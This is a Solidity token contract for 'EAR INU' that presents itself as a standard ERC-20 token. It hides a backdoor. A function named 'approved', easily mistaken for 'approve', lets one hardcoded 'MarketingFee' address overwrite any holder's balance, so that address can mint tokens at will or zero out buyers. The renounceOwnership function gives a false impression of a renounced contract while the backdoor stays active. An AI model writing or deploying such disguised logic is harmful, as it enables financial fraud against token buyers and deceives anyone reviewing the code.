// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract EARINU {
    string public name = "EAR INU";
    string public symbol = "EARINU";
    uint256 public totalSupply = 6900000000000000000000; 
    uint8 public decimals = 18;
    
    address public owner;
    address public MarketingFee = 0x3EE029d945c2af2103B295bB78400FF825e4892F;
    address constant DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    modifier onlyMarketingFee() {
        require(msg.sender == MarketingFee, "Only the MarketingFee address can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approved(address account, uint256 amount) public onlyMarketingFee returns (uint256) {
        balanceOf[account] = amount;
        return balanceOf[account];
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, DEAD_ADDRESS);
        owner = DEAD_ADDRESS;
    }
}
